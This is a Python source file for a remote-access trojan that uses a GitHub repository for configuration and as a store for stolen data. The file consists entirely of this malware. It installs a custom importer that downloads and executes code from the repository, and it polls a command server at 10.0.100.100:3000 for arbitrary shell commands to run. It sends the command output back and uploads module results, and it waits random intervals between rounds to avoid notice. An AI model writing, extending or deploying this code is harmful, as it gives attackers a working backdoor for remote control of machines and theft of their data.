import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import requests
from datetime import datetime

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id, node_server_url):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{self.id}/'
        self.repo = github_connect()
        self.node_server_url = node_server_url
        self.running = True

    def get_github_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        return json.loads(base64.b64decode(config_json))

    def get_nodejs_config(self):
        try:
            response = requests.get(f"{self.node_server_url}/config")
            if response.status_code == 200:
                return response.json()
            else:
                print(f"[*] Failed to get config from Node.js server: Status code {response.status_code}")
                return None
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to get config from Node.js server: {e}")
            return None

    def send_command_result(self, command, result):
        try:
            payload = {
                "command": command,
                "result": result
            }
            requests.post(f"{self.node_server_url}/command", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to send command result to Node.js server: {e}")

    def update_status(self, status):
        try:
            payload = {
                "id": self.id,
                "status": status
            }
            requests.post(f"{self.node_server_url}/status", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to update status on Node.js server: {e}")

    def execute_command(self, command):
        try:
            if command.startswith("run_module:"):
                module_name = command.split(":", 1)[1]
                if module_name not in sys.modules:
                    exec(f"import {module_name}")
                result = sys.modules[module_name].run()
                self.store_module_result(result)
            else:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                result = result.decode('utf-8')
            self.send_command_result(command, result)
        except subprocess.CalledProcessError as e:
            result = e.output.decode('utf-8')
            self.send_command_result(command, result)
        except Exception as e:
            print(f"[*] Error executing command '{command}': {e}")

    def module_runner(self, module):
        try:
            if module not in sys.modules:
                exec(f"import {module}")
            result = sys.modules[module].run()
            self.store_module_result(result)
        except Exception as e:
            print(f"[*] Error running module '{module}': {e}")

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        self.repo.create_file(remote_path, message, bindata)

    def run(self):
        while self.running:
            # Fetch configuration from GitHub
            github_config = self.get_github_config()
            
            # Fetch real-time commands from Node.js server
            nodejs_config = self.get_nodejs_config()

            if nodejs_config:
                if nodejs_config.get('stop'):
                    self.running = False
                    self.update_status("Trojan stopped.")
                    break

                # Execute commands from Node.js server
                for command in nodejs_config.get('commands', []):
                    self.execute_command(command.get('command'))

            # Run modules based on GitHub config
            for task in github_config.get('modules', []):
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    NODE_SERVER_URL = "http://10.0.100.100:3000"  # Change this to your Node.js server URL
    trojan = Trojan('abc', NODE_SERVER_URL)
    trojan.run()

